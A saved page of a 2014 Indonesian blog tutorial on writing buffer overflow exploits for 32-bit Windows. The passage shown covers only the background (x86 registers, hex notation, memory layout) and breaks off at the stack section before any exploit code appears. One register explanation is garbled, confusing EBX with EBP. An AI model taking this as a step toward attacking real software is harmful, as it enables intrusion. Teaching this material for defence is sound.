<!DOCTYPE html>
<!--
    Basically Basic Jekyll Theme 1.4.1
    Copyright 2017-2018 Michael Rose - mademistakes.com | @mmistakes
    Free for personal and commercial use under the MIT license
    https://github.com/mmistakes/jekyll-basically-theme/blob/master/LICENSE.md
-->
<html class="js" lang="en-US"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
    
    <!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Cara Membuat Exploit Untuk Buffer Overflow | Harry Adinanta</title>
<meta name="generator" content="Jekyll v3.7.4">
<meta property="og:title" content="Cara Membuat Exploit Untuk Buffer Overflow">
<meta name="author" content="Harry Adinanta">
<meta property="og:locale" content="en_US">
<meta name="description" content="Istilah “Buffer Overflow” mungkin sudah tidak asing lagi bagi sebagian besar praktisi IT. Istilah ini sering digunakan untuk menjelaskan penyebab suatu software atau sistem yang berhenti bekerja (hang atau not-responding) saat melakukan suatu proses meskipun tidak semua kejadian hang atau not-responding disebabkan oleh buffer overflow.">
<meta property="og:description" content="Istilah “Buffer Overflow” mungkin sudah tidak asing lagi bagi sebagian besar praktisi IT. Istilah ini sering digunakan untuk menjelaskan penyebab suatu software atau sistem yang berhenti bekerja (hang atau not-responding) saat melakukan suatu proses meskipun tidak semua kejadian hang atau not-responding disebabkan oleh buffer overflow.">
<link rel="canonical" href="https://harryadinanta.com/exploitasi/2014/12/23/Cara-Membuat-Exploit-Untuk-Buffer-Overflow.html">
<meta property="og:url" content="https://harryadinanta.com/exploitasi/2014/12/23/Cara-Membuat-Exploit-Untuk-Buffer-Overflow.html">
<meta property="og:site_name" content="Harry Adinanta">
<meta property="og:type" content="article">
<meta property="article:published_time" content="2014-12-23T00:00:00+00:00">
<script type="application/ld+json">
{"description":"Istilah “Buffer Overflow” mungkin sudah tidak asing lagi bagi sebagian besar praktisi IT. Istilah ini sering digunakan untuk menjelaskan penyebab suatu software atau sistem yang berhenti bekerja (hang atau not-responding) saat melakukan suatu proses meskipun tidak semua kejadian hang atau not-responding disebabkan oleh buffer overflow.","author":{"@type":"Person","name":"Harry Adinanta"},"@type":"BlogPosting","url":"https://harryadinanta.com/exploitasi/2014/12/23/Cara-Membuat-Exploit-Untuk-Buffer-Overflow.html","publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"https://harryadinanta.com/assets/logo.png"},"name":"Harry Adinanta"},"headline":"Cara Membuat Exploit Untuk Buffer Overflow","dateModified":"2014-12-23T00:00:00+00:00","datePublished":"2014-12-23T00:00:00+00:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://harryadinanta.com/exploitasi/2014/12/23/Cara-Membuat-Exploit-Untuk-Buffer-Overflow.html"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->

  

  <script>
    /* Cut the mustard */
    if ( 'querySelector' in document && 'addEventListener' in window ) {
      document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + 'js';
    }
  </script>

  <link rel="stylesheet" href="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/main.css">
  
    <link rel="stylesheet" href="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/css.css">
  

  
    
    <link rel="alternate" type="application/atom+xml" title="Harry Adinanta" href="https://harryadinanta.com/atom.xml">
  
<script src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/embed.js" data-timestamp="1592917722435"></script><link rel="prefetch" as="style" href="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/a_data_002/lounge.css"><link rel="prefetch" as="script" href="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/a_data_002/common.js"><link rel="prefetch" as="script" href="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/a_data_002/lounge.js"><link rel="prefetch" as="script" href="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/a_data_002/config.js"><script src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/alfalfalfa.js" async="" charset="UTF-8"></script></head>


  <body class="layout--post cara-membuat-exploit-untuk-buffer-overflow">

    <nav class="skip-links">
  <h2 class="screen-reader-text">Skip links</h2>
  <ul>
    <li><a href="#primary-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
  </ul>
</nav>


    <div class="sidebar-toggle-wrapper">
      
        <button class="search-toggle" type="button">
          <svg class="icon" width="16" height="16" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 15.99 16">
            <title>Search</title>
            <path d="M15.5,13.12L13.19,10.8a1.69,1.69,0,0,0-1.28-.55l-0.06-.06A6.5,6.5,0,0,0,5.77,0,6.5,6.5,0,0,0,2.46,11.59a6.47,6.47,0,0,0,7.74.26l0.05,0.05a1.65,1.65,0,0,0,.5,1.24l2.38,2.38A1.68,1.68,0,0,0,15.5,13.12ZM6.4,2A4.41,4.41,0,1,1,2,6.4,4.43,4.43,0,0,1,6.4,2Z" transform="translate(-.01)"></path>
          </svg>
        </button>
      

      <button class="toggle navicon-button larr" type="button">
        <span class="toggle-inner">
          <span class="sidebar-toggle-label visually-hidden">Menu</span>
          <span class="navicon"></span>
        </span>
      </button>
    </div>

    <div id="sidebar" class="sidebar">
      <div class="inner">
        <nav id="primary-nav" class="site-nav" itemscope="" itemtype="http://schema.org/SiteNavigationElement" aria-label="Main navigation">
  <ul id="menu-main-navigation" class="menu">
    <!-- Home link -->
    <li class="menu-item">
      <a href="https://harryadinanta.com/" itemprop="url">
        <span itemprop="name">Home</span>
      </a>
    </li>

    <!-- site.pages links -->
    
    

    
      
      
        <li class="menu-item">
          <a href="https://harryadinanta.com/about.html" itemprop="url">
            <span itemprop="name">About</span>
          </a>
        </li>
      
    
      
      
        <li class="menu-item">
          <a href="https://harryadinanta.com/kategori.html" itemprop="url">
            <span itemprop="name">Kategori Artikel</span>
          </a>
        </li>
      
    
  </ul>
</nav>

        <ul class="contact-list">
  
    <li>
      <a href="mailto:adinanta@gmail.com">
        <span class="icon icon--email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="313.1 3.7 16 16"><path d="M318.5 8.9c0-.2.2-.4.4-.4h4.5c.2 0 .4.2.4.4s-.2.4-.4.4h-4.5c-.3 0-.4-.2-.4-.4zm.4 2.1h4.5c.2 0 .4-.2.4-.4s-.2-.4-.4-.4h-4.5c-.2 0-.4.2-.4.4s.1.4.4.4zm3.5 1.2c0-.2-.2-.4-.4-.4h-3.1c-.2 0-.4.2-.4.4s.2.4.4.4h3.1c.2.1.4-.1.4-.4zm-1.5-8.4l-1.7 1.4c-.2.1-.2.4 0 .6s.4.2.6 0l1.4-1.2 1.4 1.2c.2.1.4.1.6 0s.1-.4 0-.6l-1.7-1.4c-.3-.1-.5-.1-.6 0zm7.8 6.2c.1.1.1.2.1.3v7.9c0 .8-.7 1.5-1.5 1.5h-12.5c-.8 0-1.5-.7-1.5-1.5v-7.9c0-.1.1-.2.1-.3l1.6-1.3c.2-.1.4-.1.6 0s.1.4 0 .6l-1.2 1 1.8 1.3v-4c0-.6.5-1.1 1.1-1.1h7.5c.6 0 1.1.5 1.1 1.1v4l1.8-1.3-1.2-1c-.2-.1-.2-.4 0-.6s.4-.2.6 0l1.6 1.3zm-11.6 2.2l4 2.8 4-2.8V7.6c0-.1-.1-.2-.2-.2h-7.5c-.1 0-.2.1-.2.2v4.6zm10.9-1l-4.7 3.4 3.4 2.6c.2.1.2.4.1.6-.1.2-.4.2-.6.1l-3.6-2.8-1.2.8c-.1.1-.3.1-.5 0l-1.2-.8-3.6 2.8c-.2.1-.4.1-.6-.1-.1-.2-.1-.4.1-.6l3.4-2.6-4.7-3.4v7.1c0 .4.3.6.6.6h12.5c.4 0 .6-.3.6-.6v-7.1z"></path></svg></span>
        <span class="label">Email</span>
      </a>
    </li>
  

  
    <li><a href="https://github.com/adinanta">
  <span class="icon icon--github"><svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M8 0C3.58 0 0 3.582 0 8c0 3.535 2.292 6.533 5.47 7.59.4.075.547-.172.547-.385 0-.19-.007-.693-.01-1.36-2.226.483-2.695-1.073-2.695-1.073-.364-.924-.89-1.17-.89-1.17-.725-.496.056-.486.056-.486.803.056 1.225.824 1.225.824.714 1.223 1.873.87 2.33.665.072-.517.278-.87.507-1.07-1.777-.2-3.644-.888-3.644-3.953 0-.873.31-1.587.823-2.147-.09-.202-.36-1.015.07-2.117 0 0 .67-.215 2.2.82.64-.178 1.32-.266 2-.27.68.004 1.36.092 2 .27 1.52-1.035 2.19-.82 2.19-.82.43 1.102.16 1.915.08 2.117.51.56.82 1.274.82 2.147 0 3.073-1.87 3.75-3.65 3.947.28.24.54.73.54 1.48 0 1.07-.01 1.93-.01 2.19 0 .21.14.46.55.38C13.71 14.53 16 11.53 16 8c0-4.418-3.582-8-8-8"></path></svg></span>
  <span class="label">GitHub</span>
</a>
</li>
  

  
    <li><a href="https://twitter.com/adinanta">
  <span class="icon icon--twitter"><svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M16 3.038c-.59.26-1.22.437-1.885.517.677-.407 1.198-1.05 1.443-1.816-.634.37-1.337.64-2.085.79-.598-.64-1.45-1.04-2.396-1.04-1.812 0-3.282 1.47-3.282 3.28 0 .26.03.51.085.75-2.728-.13-5.147-1.44-6.766-3.42C.83 2.58.67 3.14.67 3.75c0 1.14.58 2.143 1.46 2.732-.538-.017-1.045-.165-1.487-.41v.04c0 1.59 1.13 2.918 2.633 3.22-.276.074-.566.114-.865.114-.21 0-.41-.02-.61-.058.42 1.304 1.63 2.253 3.07 2.28-1.12.88-2.54 1.404-4.07 1.404-.26 0-.52-.015-.78-.045 1.46.93 3.18 1.474 5.04 1.474 6.04 0 9.34-5 9.34-9.33 0-.14 0-.28-.01-.42.64-.46 1.2-1.04 1.64-1.7z" fill-rule="nonzero"></path></svg></span>
  <span class="label">Twitter</span>
</a>
</li>
  

  
    <li><a href="https://www.linkedin.com/in/harryadinanta">
  <span class="icon icon--linkedin"><svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M13.632 13.635h-2.37V9.922c0-.886-.018-2.025-1.234-2.025-1.235 0-1.424.964-1.424 1.96v3.778h-2.37V6H8.51v1.04h.03c.318-.6 1.092-1.233 2.247-1.233 2.4 0 2.845 1.58 2.845 3.637v4.188zM3.558 4.955c-.762 0-1.376-.617-1.376-1.377 0-.758.614-1.375 1.376-1.375.76 0 1.376.617 1.376 1.375 0 .76-.617 1.377-1.376 1.377zm1.188 8.68H2.37V6h2.376v7.635zM14.816 0H1.18C.528 0 0 .516 0 1.153v13.694C0 15.484.528 16 1.18 16h13.635c.652 0 1.185-.516 1.185-1.153V1.153C16 .516 15.467 0 14.815 0z" fill-rule="nonzero"></path></svg></span>
  <span class="label">Linkedin</span>
</a>
</li>
  

  <li>
    
      <a href="https://harryadinanta.com/atom.xml" title="Atom Feed">
        <span class="icon icon--rss"><svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" fill-rule="evenodd" clip-rule="evenodd" stroke-linejoin="round" stroke-miterlimit="1.414"><path d="M12.8 16C12.8 8.978 7.022 3.2 0 3.2V0c8.777 0 16 7.223 16 16h-3.2zM2.194 11.61c1.21 0 2.195.985 2.195 2.196 0 1.21-.99 2.194-2.2 2.194C.98 16 0 15.017 0 13.806c0-1.21.983-2.195 2.194-2.195zM10.606 16h-3.11c0-4.113-3.383-7.497-7.496-7.497v-3.11c5.818 0 10.606 4.79 10.606 10.607z"></path></svg></span>
        <span class="label">Subscribe</span>
      </a>
    
  </li>
</ul>
      </div>
    </div>

    <div class="canvas">
      <div class="wrapper">
        

<header id="masthead">
  <div class="inner">
    <div class="title-area">
      
        <p class="site-title">
          <a href="https://harryadinanta.com/">
            <img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/logo.png" alt="" class="site-logo">
            <span>Harry Adinanta</span>
          </a>
        </p>
      
    </div>
  </div>
</header>

        <div class="initial-content">
          <header class="intro">
  

  <div class="inner">
    <div class="intro-text">
      <h1 id="page-title" class="intro-title">Cara Membuat Exploit Untuk Buffer Overflow
</h1>
      

      
        

        <p class="entry-meta">
          <span class="byline-item">by Harry Adinanta</span><span class="byline-item"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="379 72 16 16"><g><g><path fill="none" d="M380.8,86.7h12.3v-8.8h-12.3V86.7z M389.5,78.8h1.7v1.4h-1.7V78.8z M389.5,81.3h1.7v1.4h-1.7V81.3z M389.5,83.8h1.7v1.4h-1.7V83.8z M386.1,78.8h1.7v1.4h-1.7V78.8z M386.1,81.3h1.7v1.4h-1.7V81.3z M386.1,83.8h1.7v1.4h-1.7V83.8z M382.8,78.8h1.7v1.4h-1.7V78.8z M382.8,81.3h1.7v1.4h-1.7V81.3z M382.8,83.8h1.7v1.4h-1.7V83.8z"></path><polygon fill="none" points="384.7 75.1 383.4 75.1 383.4 74.3 380.8 74.3 380.8 76.6 393.2 76.6 393.2 74.3 390.6 74.3 390.6 75.1 389.3 75.1 389.3 74.3 384.7 74.3"></polygon><rect x="382.8" y="78.8" width="1.7" height="1.4"></rect><rect x="386.1" y="78.8" width="1.7" height="1.4"></rect><rect x="389.5" y="78.8" width="1.7" height="1.4"></rect><rect x="382.8" y="81.3" width="1.7" height="1.4"></rect><rect x="386.1" y="81.3" width="1.7" height="1.4"></rect><rect x="389.5" y="81.3" width="1.7" height="1.4"></rect><rect x="382.8" y="83.8" width="1.7" height="1.4"></rect><rect x="386.1" y="83.8" width="1.7" height="1.4"></rect><rect x="389.5" y="83.8" width="1.7" height="1.4"></rect><path d="M383.4,72v1.1h-3.8V88h14.9V73.1h-3.8V72h-1.3v1.1h-4.7V72H383.4z M393.2,86.7h-12.3v-8.8h12.3L393.2,86.7L393.2,86.7z M389.3,74.3v0.8h1.3v-0.8h2.5v2.3h-12.3v-2.3h2.5v0.8h1.3v-0.8H389.3z"></path></g></g></svg></span><time datetime="2014-12-23T00:00:00+00:00">December 23, 2014</time></span> <span class="byline-item"><span class="icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="15 309.7 16 16"><g><path d="M23.9 315.1v3.6c0 .5-.4.9-.9.9s-.9-.4-.9-.9v-3.6h1.8z"></path><path d="M30.1 317.7c.5 3.9-2.3 7.5-6.2 7.9-3.9.5-7.5-2.3-7.9-6.2-.5-3.9 2.3-7.5 6.2-7.9v-1.8H24v1.8c1.1.1 2.7.7 3.5 1.4l1.3-1.3 1.3 1.3-1.3 1.3c.5.9 1.2 2.5 1.3 3.5zm-1.8.9c0-2.9-2.4-5.3-5.3-5.3s-5.3 2.4-5.3 5.3 2.4 5.3 5.3 5.3 5.3-2.3 5.3-5.3z"></path></g></svg></span>36 min read</span>
        </p>
      

      

      
    </div>
  </div>
</header>


<main id="main" class="page-content" aria-label="Content">
  <div class="inner">
    <article class="entry-wrap">
      <div class="entry-content">
        <h3 id="daftar-isi">Daftar Isi:</h3>

<ol>
  <li><a href="#latar-belakang">Latar Belakang</a></li>
  <li><a href="#arsitektur-cpu">Arsitektur Processor Dan Memory di Intel x86 Family</a></li>
  <li><a href="#stack">STACK</a></li>
  <li><a href="#terjadinya-buffer-overflow">Terjadinya Buffer Overflow</a></li>
  <li><a href="#mengidentifikasi-buffer-overflow">Mengidentifikasi kerentanan Buffer Overflow</a></li>
  <li><a href="#exploit-buffer-overflow">Mengeksploitasi kerentanan Buffer Overflow</a></li>
  <li><a href="#resources">Resources</a></li>
  <li><a href="#selanjutnya">Selanjutnya</a></li>
</ol>

<h3 id="latar-belakang-">Latar Belakang <a name="latar-belakang"></a></h3>

<p>Istilah <span style="color:red"><strong>“Buffer Overflow”</strong></span>
 mungkin sudah tidak asing lagi bagi sebagian besar praktisi IT. Istilah
 ini sering digunakan untuk menjelaskan penyebab suatu software atau 
sistem yang berhenti bekerja (hang atau not-responding) saat melakukan 
suatu proses meskipun tidak semua kejadian hang atau not-responding 
disebabkan oleh buffer overflow.</p>

<p>Terkenalnya istilah buffer overflow mungkin juga dipicu oleh masih 
banyaknya software yang rentan terhadap permasalahan ini. Bahkan saat 
saya menulis tutorial ini (Nov 2014), Common vulnerability database di <a class="vglnk" href="http://www.cvedetails.com/" rel="nofollow"><span>http</span><span>://</span><span>www</span><span>.</span><span>cvedetails</span><span>.</span><span>com</span></a> 
masih melaporkan adanya kerentanan buffer overflow di berbagai software 
mulai dari flash player, php sampai ke perangkat security seperti 
cyberoam appliances.</p>

<p>Dalam kesempatan ini saya ingin membahas kerentanan buffer overflow 
sedikit lebih rinci yaitu mulai dari pemahaman dasar, cara 
pendeteksianya sampai ke cara membuat exploit dimana kita akan 
memanfaatkan kerentanan tersebut untuk mendapatkan hak akses ke aplikasi
 atau ke sistem . Saya berusaha membuat tutorial ini sesederhana mungkin
 agar mudah dimengerti. Untuk itu saya sangat membutuhkan masukan 
(feedback) dari para pembaca dan juga dari para ahli (jawara security) 
agar tutorial ini dapat digunakan oleh khalayak banyak untuk memperdalam
 pengetahuan tentang keamanan Informasi.</p>

<p>Saya ingin mengingatkan bahwa tutorial ini dibuat dengan tujuan 
menyebarluaskan ilmu pengetahuan keamanan Informasi dan BUKAN digunakan 
untuk kegiatan ILLEGAL seperti HACKING. Saya tidak bertanggung jawab 
terhadap pihak yang memanfaatkan Informasi ini untuk melawan hukum.</p>

<p>Sebelum menuju ke pembahasan utama, mari kita terlebih dahulu 
mengenal apa itu buffer overflow. Buffer adalah “bagian memory yang 
menyimpan data” sementara kata overflow memiliki arti “meluap atau 
melebihi”. Dapat kita simpulkan bahwa buffer overflow adalah kondisi 
dimana bagian memory tidak mampu menampung besarnya data yang akan 
disimpan.</p>

<p>Buffer overflow terjadi saat suatu proses pada aplikasi mencoba 
menyimpan data ke bagian memory melebihi kapasitas yang telah 
dialokasikan sehingga proses penyimpanan tersebut menimpa 
(meng-overwrite) data lainnya yang tersimpan di lokasi memory yang 
berada disebelahnya. Apabila data yang tertimpa masih dibutuhkan oleh 
aplikasi, maka bisa dipastikan aplikasi akan berhenti bekerja atau hang 
saat data tersebut dibaca untuk kemudian diproses.</p>

<p>Guna memahami buffer overflow lebih baik, kita akan menggunakan 
debugger untuk melihat langsung bagaimana suatu proses atau fungsi pada 
aplikasi menyimpan data ke memory dan bagaimana proses tersebut dapat 
menimpa (overwrite) data yang tersimpan di memori segmen lainnya. Namun,
 sebelum kita menggunakan debugger, ada baiknya kita terlebih dahulu 
mengetahui tentang arsitektur memory dan processor.</p>

<h3 id="arsitektur-processor-dan-memory-di-intel-x86-family-">Arsitektur Processor Dan Memory di Intel x86 Family <a name="arsitektur-cpu"></a></h3>

<p>Agar tutorial ini mudah dimengerti, saya hanya akan membahas sekilas 
tentang arsitektur processor Intel x86 Family dimana konsep ini berlaku 
untuk semua processor bertipe Intel IA-32 (Intel Pentium &amp; Core-Duo)
 dan AMD (Athlon, Phenom &amp; Opteron).</p>

<p>Perlu diketahui bahwa tutorial ini akan membahas aplikasi yang 
berjalan di sistem operasi windows (OS) 32-bit. Agar dapat mengikuti 
tutorial ini dengan baik, maka pastikan sistem operasi (windows XP atau 
windows 7) yang digunakan adalah versi 32-bit meskipun sistem operasi 
tersebut dijalankan menggunakan processor  64-bit.</p>

<p>Untuk mengetahui bagaimana processor memproses instruksi dan 
menyimpan data di memory, mari kita bahas diagram balok sebuah 
microcomputer.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/processor-arch.jpg" class="align-center" alt="install gpg"></p>

<p>Secara umum, processor (Central Processing Unit) memiliki komponen berikut:</p>

<ul>
  <li>
    <p>Sekelompok REGISTER yang berfungsi sebagai tempat penyimpanan 
data (memory) yang berkecepatan tinggi. Perlu diketahui bahwa memory ini
 terletak di dalam CPU dan hanya digunakan untuk menyimpan data 
sementara saat CPU menjalankan serangkaian Instruksi. Misalnya, ESP 
(Extented Stack Pointer) menyimpan informasi alamat RAM yang menyimpan 
data stack atau bertindak sebagai pointer atau petunjuk lokasi 
keberadaan stack.</p>
  </li>
  <li>
    <p>ALU (Aritmatic Logic Unit) yang tugasnya melakukan operasi matematika</p>
  </li>
  <li>
    <p>CU (Control Unit) yang bertugas mengatur operasi pemprosesan Instruksi</p>
  </li>
  <li>
    <p>Clock bertugas mensinkronisasikan setiap operasi yang dilakukan CPU dengan komponen lainnya.</p>
  </li>
</ul>

<p>Disamping itu, terdapat komponen lainnya yang berada di luar CPU 
seperti main memory (RAM) yang menyimpan Instruksi dan data. Saat CPU 
membutuhkan instruksi dan data untuk diproses, CPU memanggil RAM melalui
 jalur “address bus” dan kemudian RAM mengirimkan Instruksi dan data 
yang dibutuhkan melalui jalur “Data Bus”.</p>

<p>Hal penting lainnya yang perlu untuk diketahui adalah tipe REGISTER yang tersedia di dalam CPU seperti:</p>

<ul>
  <li>
    <p>Extended Accumulator register <strong>(EAX)</strong> digunakan 
untuk keperluan perhitungan seperti penambahan, pengurangan dan juga 
menyimpan hasil output suatu fungsi (function call return value)</p>
  </li>
  <li>
    <p>Extended Base register <strong>(EBX)</strong> digunakan untuk 
menyimpan data. Register ini adalah tempat penyimpanan umum (general 
purpose register) dan tidak sama dengan register EBX yang berfungsi 
sebagai base pointer.</p>
  </li>
  <li>
    <p>Extended Counter register <strong>(ECX)</strong> berfungsi sebagai loop counter saat melakukan iterasi</p>
  </li>
  <li>
    <p>Extended Data register <strong>(EDX)</strong> merupakan perluasan
 fungsi register EAX yang dapat digunakan untuk operasi matematika yang 
kompleks seperti pengkalian dan pembagian</p>
  </li>
  <li>
    <p>Extended Base Pointer register <strong>(EBP)</strong>  digunakan 
oleh bahasa pemrograman tingkat tinggi sebagai pointer atau penunjuk 
lokasi keberadaan parameter suatu fungsi dan juga variable</p>
  </li>
  <li>
    <p>Extended Stack Pointer register <strong>(ESP)</strong> digunakan 
sebagai pointer atau penunjuk lokasi keberadaan data yang tersimpan di 
dalam stack (struktur memori yang digunakan oleh suatu proses aplikasi)</p>
  </li>
  <li>
    <p>Extended Source Index register <strong>(ESI)</strong> digunakan sebagai pointer memory yang menyimpan input data</p>
  </li>
  <li>
    <p>Extended Destination Index regsiter <strong>(EDI)</strong> digunakan sebagai pointer lokasi (memory) yang menyimpan data hasil pemprosesan yang telah selesai</p>
  </li>
  <li>
    <p>Extended Instruction pointer <strong>(EIP)</strong> digunakan sebagai pointer atau penunjuk lokasi (memory) yang menyimpan instruksi berikutnya yang akan dieksekusi oleh CPU.</p>
  </li>
</ul>

<p>Dalam pembahasan buffer overflow, kita akan lebih fokus memperhatikan perubahan di tiga register yaitu <strong>EIP, ESP</strong> dan <strong>EBP</strong>
 karena register tersebut yang akan tertimpa (ter-overwrite) saat buffer
 overflow terjadi. Pada diagram diatas, saya sudah menandakan ketiga 
register ini dengan warna biru.</p>

<blockquote>
  <p>Perlu diketahui bahwa <span style="color:red"><strong>Register dan CPU</strong></span> menyimpan dan memproses data dalam format <span style="color:red"><strong>BINARY</strong></span>
 yaitu dengan angka 0 dan 1. Namun demikian, kita (manusia) akan 
menggunakan format HEXADECIMAL saat memberikan instruksi ke CPU melalui 
 bahasa assembly atau saat melihat aktifitas CPU dengan debugger.  
Menggunakan bilangan HEX memberikan kemudahan bagi kita karena <span style="color:red"><strong>satu bilangan HEX bisa mewakili (represent) 4 bit BINARY</strong></span>
<br><br></p>
</blockquote>

<p>Sebagai contoh,</p>

<ul>
  <li>
    <p>Bilangan 0 di hexadecimal = 0000 di binary (4 bit)</p>
  </li>
  <li>
    <p>Bilangan F di hexadecimal = 1111 di binary. (4 bit)</p>
  </li>
</ul>

<p>Bilangan HEX biasanya dinyatakan dengan menambah simbol “0x\” atau 
“\x” didepannya. Misalnya binary “1111-1111” (8-bit) dapat dinyatakan 
dalam bentuk HEX “\xFF”.</p>

<p>Melanjuti pembahasan seputar register, besarnya kapasitas data yang 
bisa disimpan oleh setiap register di CPU 32-bit adalah 32-bit. Artinya,
 setiap register bisa menyimpan maksimal data dengan nilai 
“11111111-11111111-11111111-11111111” atau “\xFFFFFFFF”</p>

<p>Setiap register memiliki aturan berbeda-beda dalam menyimpan besaran 
data dalam satu kali operasi. Misalnya general purpose register (EAX, 
EBX, ECX, EDX) dapat menyimpan data dalam satuan (blok) 8-bit atau 1 
byte (1 byte = 8 bit) dalam satu kali operasi. Namun demikian, apabila 
diperlukan, register-register ini juga dapat menyimpan data dalam 
besaran 16-bit atau 2 byte dan juga bisa dalam besaran 32-bit atau 4 
byte dalam satu kali operasi. Inti dari aturan ini adalah bahwa CPU bisa
 menggunakan hanya sebagian dari ruang yang tersedia pada 
register-register tersebut dengan memangil nama register sesuai besaran 
yang diinginkan. Berikut ini nama-nama register berdasarkan besaran data
 yang bisa digunakan.</p>

<p><img src="Cara%20Membuat%20Exploit%20Untuk%20Buffer%20Overflow%20|%20Harry%20Adinanta_files/eax-register.jpg" class="align-center" alt="install gpg"></p>

<p>Berdasarkan diagram balok diatas, apabila CPU ingin mengakses atau 
menyimpan data di register EAX yang memiliki ukuran 16-bit, maka CPU 
cukup melakukan referensi terhadap register AX dan begitu juga 
seterusnya untuk ukuran lainnya. Berikut ini table nama referensi 
register berdasarkan besaran (size) yang diinginkan</p>

<div style="text-align:center">

  <table>
    <thead>
      <tr>
        <th>32-bit</th>
        <th>16-bit</th>
        <th>8-bit Tinggi</th>
        <th>8-bit Rendah</th>
      </tr>
    </thead>
    <tbody>
      <tr>
        <td>EAX</td>
        <td>AX</td>
        <td>AH</td>
        <td>AL</td>
      </tr>
      <tr>
        <td>EBX</td>
        <td>BX</td>
        <td>BH</td>
        <td>BL</td>
      </tr>
      <tr>
        <td>ECX</td>
        <td>CX</td>
        <td>CH</td>
        <td>CL</td>
      </tr>
      <tr>
        <td>EDX</td>
        <td>DX</td>
        <td>DH</td>
        <td>DL</td>
      </tr>
    </tbody>
  </table>

</div>

<p>Sementara, register lainnya seperti ESI, EDI, EBP dan ESP hanya 
menawarkan penyimpanan dan akses dalam satuan (blok) 16 bit dan 32-bit. 
Untuk EIP, akses hanya diberikan dalam satuan 32-bit karena register ini
 menyimpan pointer (alamat memory) yang menyimpan kode instruksi yang 
harus dieksekusi oleh CPU dan alamat memory tersebut semuanya dalam 
satuan 32-bit (tidak ada alamat memory yang memiliki ukuran 16 bit 
kecuali pada CPU yang 16 bit).</p>

<p>Bagi pembaca yang belum pernah mempelajari arsitektur microcomputer, 
tidak perlu khawatir apabila kurang memahami penjelasan saya diatas. 
Ikuti seluruh langkah yang ada dalam tutorial ini dan anda akan memahami
 bagaimana sebagian dari komponen ini bekerja.</p>

<p>Untuk kebutuhan pembahasan buffer overflow, berikut hal penting yang perlu diketahui:</p>

<ol>
  <li><strong>Register adalah memory yang berada di CPU</strong>. <span style="color:red"><strong>Register biasanya hanya menyimpan alamat (address) RAM</strong></span>
 yang menyimpan data/instruksi yang dibutuhkan oleh CPU. Dalam hal ini 
register bertugas sebagai pointer atau petunjuk  bagi CPU untuk 
mengambil dan membaca data dari RAM.</li>
  <li><strong>Register Extended Instruction Pointer (EIP)</strong> 
adalah jenis register khusus dan hanya menyimpan alamat (address) RAM 
yang menyimpan Instruksi yang akan dieksekusi oleh CPU. Jadi, CPU akan 
selalu melihat EIP untuk mengetahui dimana instruksi berikutnya 
tersimpan dan kemudian mengambil dan mengeksekusinya.  Dalam kondisi 
buffer overflow, nilai yang tersimpan di EIP menjadi salah satu data  
yang tertimpa (ter-overwrite) sehingga CPU tidak lagi bisa membaca dan 
kemudian mengeksekusi instruksi dari lokasi yang benar.</li>
  <li><strong>Extented Stack Pointer (ESP)</strong> juga merupakan jenis
 register khusus yang berfungsi sebagai pointer/pentunjuk lokasi 
penyimpanan STACK di RAM. Kita akan bahas STACK di bagian berikutnya. 
Saat melakukan exploitasi terhadap kerentanan buffer overflow, kita akan
 memanfaatkan lokasi STACK untuk menyimpan PAYLOAD kita.</li>
</ol>

<h4 id="stack-">STACK <a name="stack"></a></h4>

<p>Saat aplikasi mulai dijalankan, Sistem Operasi membuat process dan 
kemudian menyediakan virtual memory ke aplikasi tersebut. Di Sistem 
Operasi windows, setiap aplikasi diberikan process dan Virtual memory 
tersendiri dengan alamat mulai dari 0x00000000 sampai dengan 0xFFFFFFFF 
(dinyatakan dalam HEX untuk memudahkan kita).</p>

<p>Dari virtual memory yang disediakan, memory yang berada di lokasi 
0x00000000 sampai dengan 0x7FFFFFFF dialokasikan khusus untuk kode dan 
data aplikasi dan area ini biasa disebut dengan istilah “userland memory
 segment”. Aplikasi bebas menggunakan segmen memory ini selama 
perjalanan proses aplikasi tersebut. Sementara memory yang berada 
dilokasi 0x80000000 sampai dengan 0xFFFFFFFF dialokasikan khusus untuk 
kernel dan area ini biasa disebut dengan istilah “kernel land memory 
segment”. Aplikasi tidak diperbolehkan mengganggu segmen memory ini.</p>

<p>Dalam rentang virtual memory yang diberikan kepada aplikasi (userland
